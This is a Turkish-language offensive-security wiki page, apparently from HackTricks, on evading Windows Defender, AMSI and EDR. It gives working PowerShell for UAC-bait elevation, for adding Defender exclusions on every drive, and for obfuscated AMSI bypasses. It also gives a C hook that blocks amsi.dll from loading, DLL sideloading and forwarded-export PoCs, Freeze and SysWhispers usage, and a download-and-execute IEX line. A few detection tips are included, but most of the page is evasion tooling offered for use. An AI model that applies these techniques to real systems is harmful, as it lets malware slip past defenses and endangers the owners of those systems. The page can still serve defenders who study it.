# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Bu sayfa ilk olarak** [**@m2rc_p**](https://twitter.com/m2rc_p) **tarafından yazılmıştır!**

## Defender'ı Durdurma

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender'ın çalışmasını durdurmaya yarayan bir tool.
- [no-defender](https://github.com/es3n1n/no-defender): Başka bir AV'yi taklit ederek Windows Defender'ın çalışmasını durdurmaya yarayan bir tool.
- [Yöneticiyseniz Defender'ı devre dışı bırakın](basic-powershell-for-pentesters/README.md)

### Defender'a müdahale etmeden önce installer tarzı UAC yemi

Game cheat'i gibi görünen public loader'lar genellikle önce **kullanıcıdan yetki yükseltmesini isteyen**, ardından Defender'ı etkisiz hale getiren imzasız Node.js/Nexe installer'ları olarak dağıtılır. Akış basittir:

1. `net session` ile yönetici bağlamını kontrol eder. Komut yalnızca çağıran işlem yönetici haklarına sahip olduğunda başarılı olur; dolayısıyla başarısızlık, loader'ın standart kullanıcı olarak çalıştığını gösterir.
2. Orijinal command line'ı korurken beklenen UAC onay istemini tetiklemek için kendisini `RunAs` verb'üyle hemen yeniden başlatır.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Kurbanlar zaten “cracked” yazılım yüklediklerine inandıkları için istem genellikle kabul edilir ve malware’e Defender’ın policy’sini değiştirmek için ihtiyaç duyduğu haklar verilir.<sup>[[26]](#references)</sup>

### Her sürücü harfi için kapsamlı `MpPreference` exclusions

Yetki yükseltildikten sonra GachiLoader tarzı chain’ler, servisi tamamen devre dışı bırakmak yerine Defender’ın kör noktalarını en üst düzeye çıkarır. Loader önce GUI watchdog’u (`taskkill /F /IM SecHealthUI.exe`) sonlandırır ve ardından **son derece geniş exclusions** ekleyerek her kullanıcı profili, sistem dizini ve removable disk’in taranamaz hale gelmesini sağlar:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Temel gözlemler:

- Döngü, bağlanmış tüm dosya sistemlerini (D:\, E:\, USB bellekler vb.) dolaşır; bu nedenle **diske herhangi bir yere bırakılan gelecekteki tüm payload'lar yok sayılır**.
- `.sys` uzantısı hariç tutması geleceğe yöneliktir; saldırganlar Defender'a tekrar dokunmadan daha sonra unsigned driver yükleme seçeneğini saklı tutar.
- Tüm değişiklikler `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` altında yapılır; böylece sonraki aşamalar, UAC'yi yeniden tetiklemeden hariç tutmaların kalıcı olduğunu doğrulayabilir veya bunları genişletebilir.

Hiçbir Defender service durdurulmadığından, basit health check'ler gerçek zamanlı inceleme bu yollara hiç dokunmasa bile “antivirus active” bildirmeye devam eder.<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

Günümüzde AV'ler bir dosyanın malicious olup olmadığını kontrol etmek için farklı yöntemler kullanır: static detection, dynamic analysis ve daha gelişmiş EDR'ler için behavioural analysis.

### **Static detection**

Static detection, bir binary veya script içindeki bilinen malicious string'leri ya da byte dizilerini işaretleyerek ve ayrıca dosyanın kendisinden bilgi çıkararak (ör. file description, company name, digital signatures, icon, checksum vb.) gerçekleştirilir. Bu, bilinen public tool'ları kullanmanın yakalanmanızı kolaylaştırabileceği anlamına gelir; çünkü bunlar muhtemelen analiz edilmiş ve malicious olarak işaretlenmiştir. Bu tür detection yöntemini aşmanın birkaç yolu vardır:

- **Encryption**

Binary'yi encrypt ederseniz AV'nin programınızı tespit etmesinin bir yolu kalmaz; ancak programın memory içinde decrypt edilip çalıştırılması için bir tür loader'a ihtiyacınız olur.

- **Obfuscation**

Bazen binary veya script'inizdeki bazı string'leri değiştirmeniz, onu AV'yi geçirecek hale getirmek için yeterlidir; ancak obfuscate etmeye çalıştığınız şeye bağlı olarak bu, zaman alıcı bir görev olabilir.

- **Custom tooling**

Kendi tool'larınızı geliştirirseniz bilinen bad signature'lar bulunmaz; ancak bu çok fazla zaman ve çaba gerektirir.

> [!TIP]
> Windows Defender static detection'a karşı kontrol yapmak için [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) kullanabilirsiniz. Temel olarak dosyayı birden fazla segmente böler ve ardından Defender'a her birini ayrı ayrı scan ettirir; bu şekilde binary'nizde hangi string veya byte'ların işaretlendiğini tam olarak söyleyebilir.

Practical AV Evasion hakkında bu [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)'e göz atmanızı kesinlikle öneririm.

### **Dynamic analysis**

Dynamic analysis, AV'nin binary'nizi bir sandbox içinde çalıştırıp malicious activity'yi izlemesidir (ör. browser password'larınızı decrypt edip okumaya çalışma, LSASS üzerinde minidump gerçekleştirme vb.). Bu kısımla çalışmak biraz daha zor olabilir; ancak sandbox'ları evade etmek için yapabileceğiniz bazı şeyler şunlardır:

- **Execution'dan önce Sleep** Nasıl implement edildiğine bağlı olarak bu, AV'nin dynamic analysis'ini bypass etmek için harika bir yol olabilir. AV'lerin dosyaları user's workflow'unu kesintiye uğratmayacak şekilde scan etmek için çok kısa bir süresi vardır; bu nedenle uzun sleep'ler binary'lerin analysis'ini bozabilir. Sorun şu ki birçok AV sandbox'ı, nasıl implement edildiğine bağlı olarak sleep'i atlayabilir.
- **Makinenin resource'larını kontrol etme** Sandbox'lar genellikle çalışabilecekleri çok az resource'a sahiptir (ör. < 2GB RAM); aksi halde user's machine'i yavaşlatabilirler. Burada oldukça yaratıcı da olabilirsiniz; örneğin CPU temperature'ını veya fan speed'lerini kontrol edebilirsiniz, bunların hepsi sandbox'ta implement edilmiş olmayacaktır.
- **Machine-specific check'ler** "contoso.local" domain'ine joined bir user's workstation'ını hedeflemek istiyorsanız, computer'ın domain'ini kontrol ederek belirttiğiniz domain ile eşleşip eşleşmediğini görebilirsiniz; eşleşmiyorsa programınızın exit etmesini sağlayabilirsiniz.

Microsoft Defender's Sandbox computername'inin HAL9TH olduğu ortaya çıktı; bu nedenle detonation'dan önce malware'inizde computer name'i kontrol edebilirsiniz. İsim HAL9TH ile eşleşiyorsa Defender's sandbox'ının içindesiniz demektir; bu durumda programınızın exit etmesini sağlayabilirsiniz.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>kaynak: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandboxes'a karşı kullanılabilecek [@mgeeky](https://twitter.com/mariuszbit)'den bazı diğer gerçekten iyi ipuçları:

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Bu post'ta daha önce söylediğimiz gibi, **public tool'lar** eninde sonunda **detected olur**; bu yüzden kendinize şu soruyu sormalısınız:

Örneğin LSASS dump'lamak istiyorsanız, **gerçekten mimikatz kullanmanız gerekiyor mu**? Yoksa daha az bilinen ve LSASS dump'layabilen farklı bir project kullanabilir misiniz?

Doğru cevap muhtemelen ikincisidir. mimikatz'ı örnek alırsak, muhtemelen AV'ler ve EDR'ler tarafından en çok flag'lenen malware'lerden biridir; project'in kendisi harika olsa da AV'leri aşmak için onunla çalışmak tam bir nightmare'dır. Bu nedenle elde etmeye çalıştığınız şey için alternatifler arayın.

> [!TIP]
> Payload'larınızı evasion amacıyla modify ederken Defender'da **automatic sample submission'ı kapattığınızdan** emin olun ve lütfen, uzun vadede evasion elde etmek istiyorsanız **VIRUSTOTAL'A UPLOAD ETMEYİN**. Payload'ınızın belirli bir AV tarafından detected olup olmadığını kontrol etmek istiyorsanız AV'yi bir VM üzerine install edin, automatic sample submission'ı kapatmayı deneyin ve sonuçtan memnun kalana kadar orada test edin.

## EXEs vs DLLs

Mümkün olduğunda evasion için her zaman **DLL kullanmaya öncelik verin**; deneyimlerime göre DLL file'lar genellikle **çok daha az detected** olur ve analiz edilir. Bu nedenle, bazı durumlarda detection'dan kaçınmak için kullanabileceğiniz çok basit bir trick'tir (payload'ınızın elbette DLL olarak çalıştırılabilmesinin bir yolu varsa).

Bu image'da görebileceğimiz gibi, Havoc'tan alınan bir DLL Payload'ın antiscan.me üzerindeki detection rate'i 4/26 iken EXE payload'ın detection rate'i 7/26'dır.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>normal bir Havoc EXE payload ile normal bir Havoc DLL'nin antiscan.me karşılaştırması</p></figcaption></figure>

Şimdi DLL file'larla çok daha stealthier olmanızı sağlayacak bazı trick'leri göstereceğiz.

## DLL Sideloading & Proxying

**DLL Sideloading**, hem victim application'ı hem de malicious payload(lar)ı yan yana konumlandırarak loader tarafından kullanılan DLL search order'dan yararlanır.

DLL Sideloading'e susceptible program'ları [Siofra](https://github.com/Cybereason/siofra) ve aşağıdaki powershell script'i kullanarak kontrol edebilirsiniz:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Bu komut, `"C:\Program Files\\"` içindeki DLL hijacking'e karşı savunmasız programların listesini ve yüklemeye çalıştıkları DLL dosyalarını çıktı olarak verir.

**DLL Hijackable/Sideloadable programs**'ı kendiniz **incelemenizi** önemle tavsiye ederim; bu teknik doğru şekilde uygulandığında oldukça stealthy'dir, ancak publicly known DLL Sideloadable programs kullanırsanız kolayca yakalanabilirsiniz.

Bir programın yüklemeyi beklediği ada sahip malicious bir DLL yerleştirmek payload'unuzu çalıştırmaya yetmez; çünkü program bu DLL'in içinde belirli function'lar bekler. Bu sorunu çözmek için **DLL Proxying/Forwarding** adı verilen başka bir teknik kullanacağız.

**DLL Proxying**, bir programın yaptığı çağrıları proxy (ve malicious) DLL'den original DLL'e yönlendirir; böylece programın işlevselliğini korurken payload'unuzun çalıştırılmasını da sağlar.

[SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) projesini [@flangvik](https://twitter.com/Flangvik/)'ten kullanacağım.

İzlediğim adımlar şunlardı:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Son komut bize 2 dosya verecek: bir DLL source code template'i ve yeniden adlandırılmış orijinal DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Bunlar sonuçlar:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Hem [SGN](https://github.com/EgeBalci/sgn) ile encode edilmiş shellcode'umuzun hem de proxy DLL'in [antiscan.me](https://antiscan.me) üzerindeki Detection rate değeri 0/26! Buna başarı diyebiliriz.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloading hakkında [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) içeriğini ve ele aldığımız konular hakkında daha derinlemesine bilgi edinmek için [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) içeriğini **şiddetle** izlemenizi öneririm.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modülleri, aslında "forwarders" olan function'ları export edebilir: export entry, code'a işaret etmek yerine `TargetDll.TargetFunc` biçiminde bir ASCII string içerir. Bir caller export'u resolve ettiğinde Windows loader şunları yapar:

- Henüz yüklenmemişse `TargetDll`'yi yükler
- `TargetFunc`'ı buradan resolve eder

Anlaşılması gereken temel davranışlar:
- `TargetDll` bir KnownDLL ise, korumalı KnownDLLs namespace'inden sağlanır (ör. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- `TargetDll` bir KnownDLL değilse, forward resolution işlemini gerçekleştiren modülün directory'sini de içeren normal DLL search order kullanılır.

Bu, dolaylı bir sideloading primitive'i sağlar: function'ı KnownDLL olmayan bir module name'e forward edilmiş imzalı bir DLL bulun, ardından bu imzalı DLL'yi attacker-controlled ve forwarded target module ile tamamen aynı ada sahip bir DLL ile aynı directory'ye yerleştirin. Forwarded export çağrıldığında loader forward'ı resolve eder ve DLL'inizi aynı directory'den yükleyerek DllMain'inizi çalıştırır.<sup>[[13]](#references)</sup>

Windows 11'de gözlemlenen örnek:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` bir KnownDLL değildir, bu nedenle normal arama sırasına göre çözümlenir.

PoC (copy-paste):
1) İmzalı sistem DLL'sini yazılabilir bir klasöre kopyalayın
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Aynı klasöre kötü amaçlı bir `NCRYPTPROV.dll` bırakın. Kod execution elde etmek için minimal bir DllMain yeterlidir; DllMain'i tetiklemek için forwarded function'ı uygulamanız gerekmez.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) İletmeyi imzalı bir LOLBin ile tetikleyin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Gözlemlenen davranış:
- rundll32 (signed), side-by-side `keyiso.dll` (signed) dosyasını yükler
- `KeyIsoSetAuditingInterface` çözümlenirken loader, `NCRYPTPROV.SetAuditingInterface` forward'ını takip eder
- Loader daha sonra `C:\test` konumundaki `NCRYPTPROV.dll` dosyasını yükler ve `DllMain` fonksiyonunu çalıştırır
- `SetAuditingInterface` uygulanmamışsa "missing API" hatasını yalnızca `DllMain` zaten çalıştıktan sonra alırsınız

Hunting ipuçları:
- Hedef module bir KnownDLL olmadığında forwarded export'lara odaklanın. KnownDLL'ler `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` altında listelenir.
- Forwarded export'ları şu araçlar gibi tooling kullanarak enumerate edebilirsiniz:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Adayları aramak için Windows 11 forwarder envanterine bakın: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Detection/defense fikirleri:
- LOLBins'in (ör. `rundll32.exe`) system dışı path'lerden imzalı DLL'leri yüklemesini ve ardından aynı base name'e sahip KnownDLLs olmayan DLL'leri bu directory'den yüklemesini izleyin
- Şu tür process/module chain'leri için alert oluşturun: `rundll32.exe` → system dışı `keyiso.dll` → user-writable path'ler altındaki `NCRYPTPROV.dll`
- Code integrity policy'lerini (WDAC/AppLocker) zorunlu kılın ve application directory'lerinde write+execute işlemlerini engelleyin

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Freeze'i shellcode'unuzu stealthy bir şekilde yüklemek ve execute etmek için kullanabilirsiniz.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion yalnızca bir kedi-fare oyunudur; bugün çalışan bir şey yarın tespit edilebilir. Bu nedenle hiçbir zaman yalnızca tek bir araca güvenmeyin ve mümkünse birden fazla evasion tekniğini zincirlemeyi deneyin.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDR'ler genellikle `ntdll.dll` syscall stub'larına **user-mode inline hooks** yerleştirir. Bu hook'ları bypass etmek için doğru **SSN**'yi (System Service Number) yükleyen ve hook'lanmış export entrypoint'i çalıştırmadan kernel mode'a geçiş yapan **direct** veya **indirect** syscall stub'ları oluşturabilirsiniz.<sup>[[32]](#references)</sup>

**Invocation options:**
- **Direct (embedded)**: Oluşturulan stub'a bir `syscall`/`sysenter`/`SVC #0` talimatı ekler (`ntdll` export'una erişilmez).
- **Indirect**: Kernel geçişinin `ntdll`'den kaynaklanıyormuş gibi görünmesi için `ntdll` içindeki mevcut bir `syscall` gadget'ına atlar (heuristic evasion için kullanışlıdır); **randomized indirect**, her çağrı için bir havuzdan gadget seçer.
- **Egg-hunt**: Statik `0F 05` opcode dizisini diske gömmekten kaçınır; bir syscall dizisini runtime sırasında çözer.

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: Stub byte'larını okumak yerine syscall stub'larını virtual address'e göre sıralayarak SSN'leri çıkarır.
- **SyscallsFromDisk**: Temiz bir `\KnownDlls\ntdll.dll` map'ler, SSN'leri dosyanın `.text` bölümünden okur ve ardından unmap eder (bellek içindeki tüm hook'ları bypass eder).
- **RecycledGate**: Bir stub temiz olduğunda VA-sorted SSN inference ile opcode validation'ı birleştirir; hook'lanmışsa VA inference'a geri döner.
- **HW Breakpoint**: `syscall` talimatı üzerinde DR0 ayarlar ve hook'lanmış byte'ları parse etmeden runtime sırasında `EAX` içindeki SSN'yi yakalamak için bir VEH kullanır.

SysWhispers4 kullanım örneği:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI, "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" saldırılarını önlemek için oluşturuldu. Başlangıçta AV'ler yalnızca **diskteki dosyaları** tarayabiliyordu; bu nedenle payload'ları herhangi bir şekilde **doğrudan bellekte** çalıştırabilirseniz, AV bunu önlemek için hiçbir şey yapamıyordu, çünkü yeterli görünürlüğe sahip değildi.

AMSI özelliği Windows'un şu bileşenlerine entegre edilmiştir.

- User Account Control veya UAC (EXE, COM, MSI ya da ActiveX kurulumu için elevation)
- PowerShell (script'ler, interactive kullanım ve dynamic code evaluation)
- Windows Script Host (wscript.exe ve cscript.exe)
- JavaScript ve VBScript
- Office VBA macro'ları

Antivirus çözümlerinin script davranışını, script içeriklerini hem şifrelenmemiş hem de obfuscation uygulanmamış bir biçimde açığa çıkararak incelemesini sağlar.

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` çalıştırıldığında Windows Defender üzerinde aşağıdaki alert oluşur.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

`amsi:` ifadesini ve ardından script'in çalıştığı executable'ın path'ini eklediğine dikkat edin; bu örnekte bu dosya powershell.exe'dir.

Diske hiçbir dosya bırakmadık, ancak AMSI nedeniyle bellekte çalıştırıldığımız halde yakalandık.

Ayrıca **.NET 4.8** ile birlikte C# kodu da AMSI üzerinden çalıştırılır. Bu durum, bellekte çalıştırma için `Assembly.Load(byte[])` kullanımını bile etkiler. Bu nedenle AMSI'den kaçınmak amacıyla bellekte çalıştırma yaparken daha düşük .NET sürümlerinin (4.7.2 veya altı gibi) kullanılması önerilir.

AMSI'yi aşmanın birkaç yolu vardır:

- **Obfuscation**

AMSI çoğunlukla static detection yöntemleriyle çalıştığından, yüklemeye çalıştığınız script'leri değiştirmek detection'dan kaçınmak için iyi bir yöntem olabilir.

Ancak AMSI, birden fazla katmana sahip olsa bile script'lerin obfuscation'ını kaldırabilir; bu nedenle obfuscation, nasıl uygulandığına bağlı olarak kötü bir seçenek olabilir. Bu durum kaçınma işlemini kolay olmaktan çıkarır. Bununla birlikte bazen yalnızca birkaç variable adını değiştirmeniz yeterli olur; dolayısıyla bu, bir şeyin ne ölçüde flag edildiğine bağlıdır.

- **AMSI Bypass**

AMSI, powershell (ayrıca cscript.exe, wscript.exe vb.) process'ine bir DLL yüklenerek uygulandığından, unprivileged user olarak çalışırken bile buna kolayca müdahale etmek mümkündür. AMSI uygulamasındaki bu flaw nedeniyle researchers, AMSI scanning'den kaçınmak için birden fazla yöntem bulmuştur.

**Forcing an Error**

AMSI initialization işleminin başarısız olmaya zorlanması (`amsiInitFailed`), mevcut process için hiçbir scan başlatılmamasını sağlar. Bu yöntem ilk olarak [Matt Graeber](https://twitter.com/mattifestation) tarafından açıklandı ve Microsoft daha geniş kullanımını önlemek için bir signature geliştirdi.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Tek gereken, mevcut powershell işlemi için AMSI'yi kullanılamaz hâle getirmek üzere tek satırlık bir powershell koduydu. Elbette bu satır AMSI tarafından algılandı; dolayısıyla bu tekniği kullanabilmek için bazı değişiklikler yapılması gerekiyor.

İşte bu [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)'ten aldığım değiştirilmiş bir AMSI bypass'ı.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Bunu aklınızda bulundurun: Bu gönderi yayınlandıktan sonra muhtemelen flaglenecektir; bu nedenle planınız tespit edilmeden kalmaksa herhangi bir kod yayınlamamalısınız.

**Memory Patching**

Bu technique ilk olarak [@RastaMouse](https://twitter.com/_RastaMouse/) tarafından keşfedildi. Kullanıcı tarafından sağlanan girdiyi taramaktan sorumlu olan amsi.dll içindeki "AmsiScanBuffer" function adresini bulmayı ve bunu E_INVALIDARG kodunu döndürecek instructions ile üzerine yazmayı içerir. Böylece gerçek scan sonucu 0 döner ve bu değer temiz bir sonuç olarak yorumlanır.

> [!TIP]
> Daha ayrıntılı bir açıklama için lütfen [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) adresini okuyun.

AMSI'yi powershell ile bypass etmek için kullanılan daha birçok technique de vardır. Bunlar hakkında daha fazla bilgi edinmek için [**bu sayfaya**](basic-powershell-for-pentesters/index.html#amsi-bypass) ve [**bu repo'ya**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) göz atın.

### amsi.dll yüklemesini engelleyerek AMSI'yi bloklama (LdrLoadDll hook)

AMSI yalnızca `amsi.dll` mevcut process'e yüklendikten sonra başlatılır. Sağlam ve dilden bağımsız bir bypass yöntemi, `ntdll!LdrLoadDll` üzerine, istenen module `amsi.dll` olduğunda hata döndüren bir user-mode hook yerleştirmektir. Bunun sonucunda AMSI hiçbir zaman yüklenmez ve bu process için hiçbir scan gerçekleştirilmez.<sup>[[23]](#references)</sup>

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notlar
- PowerShell, WScript/CScript ve custom loader'lar genelinde çalışır (aksi takdirde AMSI'yi yükleyecek her şey).
- Uzun command-line kalıntılarını önlemek için script'leri stdin üzerinden beslemeyle (`PowerShell.exe -NoProfile -NonInteractive -Command -`) birlikte kullanın.
- LOLBins üzerinden çalıştırılan loader'lar tarafından kullanıldığı görülmüştür (ör. `regsvr32`, `DllRegisterServer` çağırıyor).

**[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** aracı da AMSI'yi bypass etmek için script oluşturur.
**[https://amsibypass.com/](https://amsibypass.com/)** aracı da randomized user-defined function, variables, characters expression kullanarak ve signature'ı önlemek için PowerShell keyword'lerine random character casing uygulayarak signature'dan kaçınan AMSI bypass script'leri oluşturur.

**Tespit edilen signature'ı kaldırma**

Tespit edilen AMSI signature'ını mevcut process'in memory'sinden kaldırmak için **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** ve **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** gibi bir tool kullanabilirsiniz. Bu tool, AMSI signature'ı için mevcut process'in memory'sini tarar ve ardından signature'ı NOP instruction'larıyla üzerine yazarak etkili bir şekilde memory'den kaldırır.

**AMSI kullanan AV/EDR ürünleri**

AMSI kullanan AV/EDR ürünlerinin listesini **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** adresinde bulabilirsiniz.

**PowerShell version 2 kullanın**
PowerShell version 2 kullanırsanız AMSI yüklenmez; böylece script'lerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Bunu şu şekilde yapabilirsiniz:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging, bir sistemde yürütülen tüm PowerShell komutlarını günlüğe kaydetmenizi sağlayan bir özelliktir. Bu özellik denetim ve sorun giderme amaçları için yararlı olabilir, ancak **tespitten kaçmak isteyen saldırganlar için bir sorun da oluşturabilir**.

PowerShell logging'i bypass etmek için aşağıdaki teknikleri kullanabilirsiniz:

- **PowerShell Transcription ve Module Logging'i devre dışı bırakma**: Bu amaçla [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) gibi bir araç kullanabilirsiniz.
- **PowerShell version 2 kullanma**: PowerShell version 2 kullanırsanız AMSI yüklenmez; böylece script'lerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Bunu şu şekilde yapabilirsiniz: `powershell.exe -version 2`
- **Unmanaged PowerShell session kullanma**: `powershell.exe` başlatmadan PowerShell'i barındırmak için [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kullanın (Cobalt Strike'ın `powerpick` tarafından kullanılan yaklaşım). Bu, özellikle `powershell.exe` process'ine bağlı kontrollerden kaçınır; ancak AMSI, Script Block Logging veya diğer tüm PowerShell savunmalarını kendiliğinden devre dışı bırakmaz; kapsam runtime'a ve host implementation'a bağlıdır.


## Obfuscation

> [!TIP]
> Çeşitli obfuscation teknikleri verileri encrypt etmeye dayanır. Bu da binary'nin entropy'sini artırarak AV'lerin ve EDR'lerin onu tespit etmesini kolaylaştırır. Buna dikkat edin ve encryption işlemini belki yalnızca kodunuzun hassas olan veya gizlenmesi gereken belirli bölümlerine uygulayın.

### ConfuserEx-Korumalı .NET Binary'lerini Deobfuscate Etme

ConfuserEx 2 (veya ticari fork'lar) kullanan malware'i analiz ederken decompiler'ları ve sandbox'ları engelleyen birkaç koruma katmanıyla karşılaşmak yaygındır. Aşağıdaki workflow, daha sonra dnSpy veya ILSpy gibi araçlarda C#'a decompile edilebilen, orijinale **oldukça yakın bir IL'i güvenilir şekilde geri yükler**.<sup>[[10]](#references)</sup>

1.  Anti-tampering removal – ConfuserEx her *method body*'yi encrypt eder ve bunların şifresini *module* static constructor'ı (`<Module>.cctor`) içinde çözer. Ayrıca PE checksum'ını patch'leyerek herhangi bir değişikliğin binary'nin crash olmasına neden olmasını sağlar. Encrypt edilmiş metadata tablolarını bulmak, XOR key'lerini kurtarmak ve temiz bir assembly yeniden yazmak için **AntiTamperKiller** kullanın:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Çıktı, kendi unpacker'ınızı oluştururken yararlı olabilecek 6 anti-tamper parametresini (`key0-key3`, `nameHash`, `internKey`) içerir.

